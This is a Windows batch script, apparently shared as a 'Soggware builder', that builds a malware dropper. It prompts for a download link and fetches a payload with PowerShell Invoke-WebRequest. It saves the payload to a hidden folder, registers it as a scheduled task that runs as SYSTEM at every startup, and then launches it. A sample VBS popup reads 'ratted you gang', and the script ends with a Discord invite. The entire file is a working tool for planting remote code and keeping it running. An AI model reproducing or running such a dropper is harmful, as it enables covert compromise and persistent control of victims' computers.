:: New Update!
:: Replaced the registry commands with scheduled tasks.
:: I did some research and saw it can auto-elevate.
@echo off
color 0C
title Soggware builder
setlocal enabledelayedexpansion
:: asking for user inputs
echo name of the malware?
set /p malware=">> "
echo File extension of the malware?
set /p fileext=">> "
echo file location? example: %userprofile%\appdata\roaming\1idszgfweay
set /p fileloc=">> "
echo do you want to IWR malware? (Y/N)
set /p iwr=">> "
:: checks if the malware already exists in the scheduled tasks library, if it does exist it just exits. otherwise it continues
:: by the way i added the check after the variables were set so that it can check it without it having to read null variables.
schtasks /query /tn "%malware%" /fo LIST /v
if %errorlevel%==0 (
    echo malware already exists no need to do this again.
    timeout /t 1 >nul
    exit /b
) else (
    echo malware does not exist, continuing...
)
:: user input for the Invoke Web request.
if /i "%iwr%"=="Y" (
    echo ok bet, provide the link to the malware. if its dropbox add dl=1 to the end of the link
    set /p iwrlink=">> "
    set "DOWNLOAD_LINK=%iwrlink%"
    :: downloads the malware using powershell invoke-webrequest, and then executes it in a hidden window.
    mkdir "%fileloc%" >nul 2>&1
    set "fullfilepath=%fileloc%\%malware%%fileext%"
    powershell -Command "$iwr = $env:DOWNLOAD_LINK; Invoke-WebRequest -Uri $iwr -OutFile '%fileloc%\%malware%%fileext%' -UserAgent 'Mozilla/5.0'"
    if errorlevel==0 (
        echo succeeded continuing...
    ) else (
        echo failed to download, there might be a problem with your wifi. Please try again
        timeout /t 1 >nul
        exit /b
    )
    schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc ONSTART /rl highest /ru SYSTEM /f
    if errorlevel==0 (
        echo Successfully added to scheduled taskss
        attrib +h "!fileloc!" 
        start "" "!fullfilepath!"
        timeout /t 1 >nul
            exit /b
    ) else (
        echo Failed. Please try again
        timeout /t 1 >nul
        exit /b
    )
    exit /b
) else (
    echo skipping download...
    timeout /t 1 >nul
)
if exist "%fileloc%" (
    echo filelocation already exists
    echo skipping
    timeout /t 1 >nul
) else (
    mkdir "%fileloc%" >nul 2>&1
    attrib +h "%fileloc%" >nul 2>&1
)
:main
:: the script i am about to provide is my own script, you are free to use my script but its recommended to make your own.
echo building...
timeout /t 1 >nul
:: creates a vbs file that just shows a message box.
:: change it however you want, this is just an example.
echo MsgBox "Soggyware ratted you gang.", 16 + 3 + 4096, "Soggyware" >> "%fileloc%\%malware%.vbs"
schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc ONSTART /ru SYSTEM /rl highest /f
start "" "%fileloc%\%malware%.vbs"
echo thank you for choosing soggware. come again soon
start "" https://discord.com/invite/29uepW58st
timeout /t 1 >nul
exit /b
